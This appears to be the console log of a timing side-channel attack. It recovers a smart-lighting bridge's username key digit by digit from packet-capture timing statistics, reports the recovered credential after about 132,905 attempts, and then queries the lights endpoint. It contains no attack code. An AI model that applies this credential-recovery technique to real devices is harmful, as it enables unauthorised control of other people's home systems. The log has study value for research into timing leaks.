Parsing data...
Parsing  data/2014-10-30-15-19-11.pcap
Parsing  data/2014-10-30-15-19-26.pcap
Parsing  data/2014-10-30-15-19-41.pcap
Parsing  data/2014-10-30-15-19-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 3647
63645 3646
63646 3647
63647 3646
63640 3647
63641 3648
63642 3646
63643 3645
k1 k2 p
63644  63645  0.281822004695
63644  63646  0.112267974268
63644  63647  0.481894018202
63644  63640  0.392049577413
63644  63641  0.954780293744
63644  63642  0.949967961883
63644  63643  0.998325856157
63645  63646  0.00138613380091
63645  63647  0.550578679091
63645  63640  0.994545127358
63645  63641  0.444156186611
63645  63642  0.341041347315
63645  63643  0.405464689792
63646  63647  0.00236232615645
63646  63640  0.00362832399334
63646  63641  0.0349121048711
63646  63642  0.0345574614491
63646  63643  0.0721166779537
63647  63640  0.31256129304
63647  63641  0.352768530291
63647  63642  0.528125068107
63647  63643  0.432171388575
63640  63641  0.577123444533
63640  63642  0.510322272583
63640  63643  0.491873193598
63641  63642  0.845884100556
63641  63643  0.902335219438
63642  63643  0.700687834623
{'63640': 1,
 '63641': 1,
 '63642': 1,
 '63643': 1,
 '63645': 1,
 '63646': 6,
 '63647': 1}
CHANGING GUESS:  63646
Guess time:  664.056420088
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 63646
111100 2460.656401 28.381428
111200 2462.835266 45.895451
111300 2465.014449 45.888757
111400 2467.193000 45.902071
111500 2469.371574 45.901588
111600 2471.549692 45.911195
111700 2473.727262 45.922747
111800 2475.905314 45.912587
111900 2478.083126 45.917644
112000 2480.260799 45.920580
112100 2482.438973 45.910014
112200 2484.616701 45.919413
112300 2486.794804 45.911512
112400 2488.972344 45.923385
112500 2491.150479 45.910833
112600 2493.328366 45.916065
112700 2495.506761 45.905356
112800 2497.684579 45.917518
112900 2499.862186 45.921972
113000 2502.039795 45.921927
113100 2504.217518 45.919519
113200 2506.395574 45.912502
113300 2508.573203 45.921505
113400 2510.750988 45.918217
113500 2512.929330 45.906472
113600 2515.107027 45.920072
113700 2517.284474 45.925341
113800 2519.462065 45.922309
113900 2521.640706 45.900172
114000 2523.818414 45.919841
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-20-26.pcap
Parsing  data/2014-10-30-15-20-41.pcap
Parsing  data/2014-10-30-15-20-56.pcap
Parsing  data/2014-10-30-15-21-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 344
636462 344
636461 344
636460 345
636467 345
636466 344
636465 344
636464 344
Collecting data:
114100 2526.809131 33.436796
114200 2528.986952 45.917458
114300 2531.164496 45.923300
114400 2533.342108 45.921862
114500 2535.520509 45.905231
114600 2537.698280 45.918508
114700 2539.876152 45.916382
114800 2542.054417 45.908095
114900 2544.232019 45.922078
115000 2546.409749 45.919373
115100 2548.587239 45.924436
115200 2550.765618 45.905693
115300 2552.943176 45.923003
115400 2555.121949 45.897394
115500 2557.299473 45.923717
115600 2559.476997 45.923717
115700 2561.654560 45.922897
115800 2563.832357 45.917965
115900 2566.010544 45.909738
116000 2568.188146 45.922073
116100 2570.365902 45.918830
116200 2572.544082 45.909889
116300 2574.722064 45.914060
116400 2576.899732 45.920680
116500 2579.077421 45.920243
116600 2581.255617 45.909547
116700 2583.433717 45.911577
116800 2585.611385 45.920680
116900 2587.789115 45.919378
117000 2589.967132 45.913321
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-21-26.pcap
Parsing  data/2014-10-30-15-21-41.pcap
Parsing  data/2014-10-30-15-21-56.pcap
Parsing  data/2014-10-30-15-22-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 684
636462 684
636461 684
636460 684
636467 684
636466 684
636465 684
636464 683
Collecting data:
117100 2592.988956 33.092597
117200 2595.166895 45.914970
117300 2597.345171 45.907863
117400 2599.522915 45.919076
117500 2601.701486 45.901649
117600 2603.878951 45.924964
117700 2606.056561 45.921907
117800 2608.234333 45.918488
117900 2610.411995 45.920811
118000 2612.590249 45.908326
118100 2614.768626 45.905738
118200 2616.946248 45.921650
118300 2619.124261 45.913406
118400 2621.302328 45.912271
118500 2623.479785 45.925135
118600 2625.658084 45.907381
118700 2627.836452 45.905924
118800 2630.013853 45.926312
118900 2632.192464 45.900805
119000 2634.370245 45.918302
119100 2636.547839 45.922244
119200 2638.725285 45.925361
119300 2640.904252 45.893306
119400 2643.081887 45.921379
119500 2645.259442 45.923063
119600 2647.437097 45.920957
119700 2649.614742 45.921168
119800 2651.793054 45.907105
119900 2653.970362 45.928278
120000 2656.148748 45.905547
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-22-26.pcap
Parsing  data/2014-10-30-15-22-41.pcap
Parsing  data/2014-10-30-15-22-56.pcap
Parsing  data/2014-10-30-15-23-11.pcap
Parsing  data/2014-10-30-15-23-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 1109
636462 1109
636461 1109
636460 1110
636467 1110
636466 1109
636465 1109
636464 1110
Collecting data:
120100 2659.267507 32.064034
120200 2661.445694 45.909743
120300 2663.623249 45.923063
120400 2665.800872 45.921630
120500 2667.978315 45.925427
120600 2670.155666 45.927368
120700 2672.333860 45.909597
120800 2674.511839 45.914125
120900 2676.689610 45.918508
121000 2678.867358 45.918996
121100 2681.044993 45.921379
121200 2683.222543 45.923169
121300 2685.400120 45.922601
121400 2687.578231 45.911341
121500 2689.755894 45.920791
121600 2691.934235 45.906492
121700 2694.111919 45.920348
121800 2696.289542 45.921630
121900 2698.467238 45.920092
122000 2700.645257 45.913281
122100 2702.822985 45.919418
122200 2705.000470 45.924542
122300 2707.177957 45.924496
122400 2709.355477 45.923802
122500 2711.533398 45.915352
122600 2713.711322 45.915281
122700 2715.889277 45.914633
122800 2718.067041 45.918659
122900 2720.244823 45.918277
123000 2722.422893 45.912205
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-23-41.pcap
Parsing  data/2014-10-30-15-23-56.pcap
Parsing  data/2014-10-30-15-24-11.pcap
Parsing  data/2014-10-30-15-24-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 1448
636462 1448
636461 1448
636460 1449
636467 1448
636466 1449
636465 1447
636464 1449
Collecting data:
123100 2725.457294 32.955434
123200 2727.634978 45.920343
123300 2729.812586 45.921947
123400 2731.991088 45.903106
123500 2734.174375 45.802496
123600 2736.359001 45.774428
123700 2738.536497 45.924305
123800 2740.714395 45.915834
123900 2742.892908 45.902869
124000 2745.071776 45.895395
124100 2747.250890 45.890208
124200 2749.429955 45.891243
124300 2751.609805 45.874714
124400 2753.788780 45.893141
124500 2755.967646 45.895431
124600 2758.146466 45.896405
124700 2760.325255 45.897058
124800 2762.504890 45.879240
124900 2764.684022 45.889832
125000 2766.863210 45.888652
125100 2769.042191 45.893010
125200 2771.220859 45.899604
125300 2773.399539 45.899353
125400 2775.579001 45.882884
125500 2777.758113 45.890253
125600 2779.936901 45.897073
125700 2782.116966 45.870194
125800 2784.295623 45.899835
125900 2786.474446 45.896340
126000 2788.653260 45.896530
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-24-41.pcap
Parsing  data/2014-10-30-15-24-56.pcap
Parsing  data/2014-10-30-15-25-11.pcap
Parsing  data/2014-10-30-15-25-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 1787
636462 1787
636461 1787
636460 1788
636467 1788
636466 1787
636465 1787
636464 1788
k1 k2 p
636463  636462  0.575887873324
636463  636461  0.336733987425
636463  636460  0.926180014444
636463  636467  0.316057800245
636463  636466  0.918210852637
636463  636465  0.367116613312
636463  636464  0.185350755364
636462  636461  0.993862716815
636462  636460  0.158882148178
636462  636467  0.0207149344682
636462  636466  0.198296663645
636462  636465  0.864152645093
636462  636464  0.723747724177
636461  636460  0.305616082642
636461  636467  0.0154583804745
636461  636466  0.11229628513
636461  636465  0.6918451119
636461  636464  0.887302765871
636460  636467  0.306289292338
636460  636466  0.362354005612
636460  636465  0.203897515207
636460  636464  0.0946691379761
636467  636466  0.182037494293
636467  636465  0.0195284012812
636467  636464  0.0152109613302
636466  636465  0.149011852971
636466  636464  0.119298092795
636465  636464  0.279409429761
{'636460': 1, '636461': 1, '636462': 1, '636464': 2, '636465': 1, '636467': 4}
Collecting data:
126100 2791.876103 31.028506
126200 2794.055080 45.893095
126300 2796.234195 45.890188
126400 2798.412856 45.899750
126500 2800.591914 45.891393
126600 2802.770982 45.891177
126700 2804.949847 45.895456
126800 2807.129379 45.881408
126900 2809.308037 45.899815
127000 2811.487576 45.881263
127100 2813.666330 45.897791
127200 2815.845009 45.899373
127300 2818.024570 45.880801
127400 2820.203384 45.896530
127500 2822.382970 45.880269
127600 2824.562244 45.886845
127700 2826.740796 45.902046
127800 2828.919880 45.890846
127900 2831.098360 45.903563
128000 2833.275659 45.928464
128100 2835.453370 45.919775
128200 2837.631997 45.900468
128300 2839.809575 45.922581
128400 2841.987725 45.910522
128500 2844.165303 45.922581
128600 2846.342988 45.920323
128700 2848.520217 45.929943
128800 2850.697608 45.926523
128900 2852.875178 45.922747
129000 2855.053155 45.914170
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-25-41.pcap
Parsing  data/2014-10-30-15-25-56.pcap
Parsing  data/2014-10-30-15-26-11.pcap
Parsing  data/2014-10-30-15-26-26.pcap
Parsing  data/2014-10-30-15-26-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 2212
636462 2212
636461 2211
636460 2212
636467 2211
636466 2212
636465 2211
636464 2212
k1 k2 p
636463  636462  0.48676813011
636463  636461  0.221539037111
636463  636460  0.959788471674
636463  636467  0.330802324195
636463  636466  0.897250609112
636463  636465  0.492250998809
636463  636464  0.318424685894
636462  636461  0.675931192278
636462  636460  0.612169066014
636462  636467  0.0813522205726
636462  636466  0.340329340852
636462  636465  0.812845425521
636462  636464  0.94136989717
636461  636460  0.190421401808
636461  636467  0.00278232852886
636461  636466  0.0295559117319
636461  636465  0.311682000414
636461  636464  0.953892678081
636460  636467  0.276042127464
636460  636466  0.349989781963
636460  636465  0.351649965592
636460  636464  0.258459153994
636467  636466  0.309561476396
636467  636465  0.0160932113746
636467  636464  0.0147074221253
636466  636465  0.113497047573
636466  636464  0.0620171513359
636465  636464  0.603842167569
{'636461': 2, '636462': 1, '636464': 2, '636465': 1, '636466': 2, '636467': 4}
Collecting data:
129100 2858.419729 29.703787
129200 2860.598115 45.905547
129300 2862.776207 45.911743
129400 2864.954198 45.913869
129500 2867.132522 45.906853
129600 2869.310201 45.920454
129700 2871.488789 45.901287
129800 2873.666487 45.920052
129900 2875.843980 45.924371
130000 2878.021723 45.919102
130100 2880.199384 45.920831
130200 2882.377507 45.911090
130300 2884.555195 45.920258
130400 2886.733763 45.901714
130500 2888.911404 45.921248
130600 2891.089024 45.921696
130700 2893.292162 45.389806
130800 2895.470221 45.912436
130900 2897.648248 45.913115
131000 2899.826090 45.917010
131100 2902.004106 45.913346
131200 2904.182050 45.914864
131300 2906.359831 45.918297
131400 2908.537431 45.922118
131500 2910.715446 45.913366
131600 2912.893358 45.915538
131700 2915.071751 45.905396
131800 2917.249475 45.919504
131900 2919.427096 45.921671
132000 2921.604655 45.922983
Current guess:  63646
Parsing data...
Parsing  data/2014-10-30-15-26-56.pcap
Parsing  data/2014-10-30-15-27-11.pcap
Parsing  data/2014-10-30-15-27-26.pcap
Parsing  data/2014-10-30-15-27-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
636463 2549
636462 2549
636461 2548
636460 2549
636467 2549
636466 2549
636465 2549
636464 2549
k1 k2 p
636463  636462  0.746171796741
636463  636461  0.24949269765
636463  636460  0.872721274677
636463  636467  0.151277268028
636463  636466  0.722054538884
636463  636465  0.697870712992
636463  636464  0.54989285999
636462  636461  0.359914788148
636462  636460  0.655052290405
636462  636467  0.0529957055223
636462  636466  0.271567867394
636462  636465  0.792704318152
636462  636464  0.981572360649
636461  636460  0.172792465478
636461  636467  0.0027806392089
636461  636466  0.0220544903408
636461  636465  0.136188931563
636461  636464  0.856291786309
636460  636467  0.290430184597
636460  636466  0.220457703594
636460  636465  0.760158508706
636460  636464  0.409198403274
636467  636466  0.436316745109
636467  636465  0.0556919166267
636467  636464  0.0133824275905
636466  636465  0.169460937223
636466  636464  0.0959554246042
636465  636464  0.555117082681
{'636461': 2, '636462': 1, '636464': 2, '636465': 1, '636466': 2, '636467': 4}
Collecting data:
132100 2924.908848 30.264576
132200 2927.087094 45.908497
132300 2929.265033 45.914970
132400 2931.443044 45.913452
132500 2933.620549 45.924119
132600 2935.798159 45.921902
132700 2937.976020 45.916613
132800 2940.153607 45.922390
132900 2942.331771 45.910225
================================================================================

Found correct username:  6364670773
Elapsed time:  49.0407443007 min
Total Attempts:  132905
================================================================================
Searching for lights
[{u'success': {u'/lights': u'Searching for new devices'}}]

(0.005 delay)